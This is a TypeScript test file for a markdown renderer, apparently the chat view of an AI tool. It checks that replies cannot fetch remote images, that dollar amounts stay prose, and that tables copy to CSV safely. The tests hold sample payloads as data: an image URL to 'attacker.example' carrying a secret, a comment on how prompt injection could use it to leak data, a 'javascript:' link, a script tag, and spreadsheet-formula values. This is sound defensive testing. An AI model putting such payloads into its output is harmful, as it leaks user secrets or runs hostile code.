import assert from 'node:assert/strict';
import { test } from 'node:test';
import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import ReactMarkdown from 'react-markdown';
import remarkGfm from 'remark-gfm';
import remarkMath from 'remark-math';
import { dollars } from '../src/ui/math.ts';
import { safe } from '../src/ui/safe.ts';
import { csv } from '../src/ui/table.ts';

const html = (markdown: string) => renderToStaticMarkup(createElement(ReactMarkdown, { remarkPlugins: [remarkGfm], components: safe }, markdown));

test('a reply cannot make the page fetch anything: only the profile\'s own images and pictures on this machine are drawn, and a link waits for a click', () => {
  // An image elsewhere would send its address, and whatever a prompt injection put in it, the moment the reply is shown.
  const remote = html('![chart](https://attacker.example/p.png?d=SECRET)');
  assert.doesNotMatch(remote, /<img|<link|preload/);
  assert.equal(remote, '<p><a href="https://attacker.example/p.png?d=SECRET" target="_blank" rel="noreferrer noopener">chart</a></p>');
  for (const address of ['//attacker.example/p.png', '/images/work/../../elsewhere', 'http://127.0.0.1:4780/images/work/0123456789abcdef', 'data:image/png;base64,AAAA'])
    assert.doesNotMatch(html(`![x](${address})`), /<img/, address);
  assert.match(html('![shot](/images/work/0123456789abcdef)'), /<p><img src="\/images\/work\/0123456789abcdef" alt="shot"\/><\/p>$/);
  // A picture on this machine by its absolute path, which the page asks this server for; not a relative one, nor another kind.
  assert.match(html('![chart](</tmp/a chart.png>)'), /<img src="\/file\?path=%2Ftmp%2Fa\+chart\.png&amp;token=" alt="chart"\/>/);
  // An escaped # is part of the file's name.
  assert.match(html('![chart](/tmp/chart%231.png)'), /path=%2Ftmp%2Fchart%231\.png&amp;/);
  for (const address of ['tmp/chart.png', '/tmp/notes.svg', '/tmp/chart.png?x=1', 'file:///tmp/chart.png'])
    assert.doesNotMatch(html(`![x](${address})`), /<img/, address);

  assert.equal(html('[docs](https://example.com/a)'), '<p><a href="https://example.com/a" target="_blank" rel="noreferrer noopener">docs</a></p>');
  assert.doesNotMatch(html('[run](javascript:alert(1)) and <img src="https://attacker.example/x.png"> and <script>alert(1)</script>'), /javascript:|<img|<script/);
});

const formulas = (markdown: string) => [...renderToStaticMarkup(createElement(ReactMarkdown, { remarkPlugins: [remarkGfm, remarkMath, dollars] }, markdown)).matchAll(/<code class="language-math math-(?:inline|display)">([^<]*)<\/code>/g)].map(match => match[1]);

test('dollar amounts stay prose, and a formula on the same line is still one', () => {
  for (const prose of ['It costs $5 and $10.', 'Budget $5-$10 per seat, or $20,000-$30,000 a year.', 'Plans are $5/$10 monthly.', 'Set $HOME, then $PATH.', 'export PATH=$HOME/bin:$PATH', 'Join $FOO/$BAR.', 'Log in as $USER:$HOME.', 'Take $a-$b.', 'echo $HOME/${USER}', 'Pay $5 now ($\\alpha$ is the multiplier).'])
    assert.deepEqual(formulas(prose), [], prose);
  assert.match(renderToStaticMarkup(createElement(ReactMarkdown, { remarkPlugins: [remarkMath, dollars] }, 'It costs $5 and $10.')), /<p>It costs \$5 and \$10\.<\/p>/);
  assert.deepEqual(formulas('Price $5 and $10 stays. The formula is $x_i$ and $$y^2$$.'), ['x_i', 'y^2']);
  assert.deepEqual(formulas('$$\n\\frac{a}{b}\n$$'), ['\\frac{a}{b}']);
  assert.deepEqual(formulas('Code `$x$` stays code.'), []);
  // A false pair across two quoted lines goes back as its words, without the second line's marker.
  assert.match(renderToStaticMarkup(createElement(ReactMarkdown, { remarkPlugins: [remarkMath, dollars] }, '> $5 and\n> $10')), /<p>\$5 and\n\$10<\/p>/);
});

test('a table copies as CSV, a cell as it reads and never as a spreadsheet formula', () => {
  let copied = '';
  renderToStaticMarkup(createElement(ReactMarkdown, { remarkPlugins: [remarkGfm, remarkMath, dollars], components: { table: ({ node }) => (copied = node ? csv(node) : '', null) } },
    '| Name | Note |\n| --- | --- |\n| `a`, b | says "hi" |\n| $x$ | **bold**  text |\n| =HYPERLINK("x") | -5 |\n| ![chart](/c.png) | -x |\n| -1+cmd | -0.5 |'));
  assert.equal(copied, 'Name,Note\n"a, b","says ""hi"""\nx,bold text\n"\'=HYPERLINK(""x"")",-5\nchart,\'-x\n\'-1+cmd,-0.5');
});
